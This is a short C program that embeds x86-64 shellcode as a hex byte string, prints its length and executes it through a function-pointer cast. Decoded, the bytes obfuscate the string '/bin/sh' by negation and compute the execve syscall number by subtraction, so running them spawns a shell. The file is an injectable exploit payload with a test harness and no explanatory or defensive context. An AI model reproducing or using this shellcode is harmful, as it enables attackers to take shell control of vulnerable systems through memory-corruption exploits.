#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x48\x89\xd1\x48\x29\xca\x48\xbb\xd1\xd0\x9d\x96\x91\xd0\x8c\x97\x48\xf7\xdb\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x5f\x2c\x24\x0f\x05";
main()
{

	printf("Shellcode Length:  %d\n", (int)strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}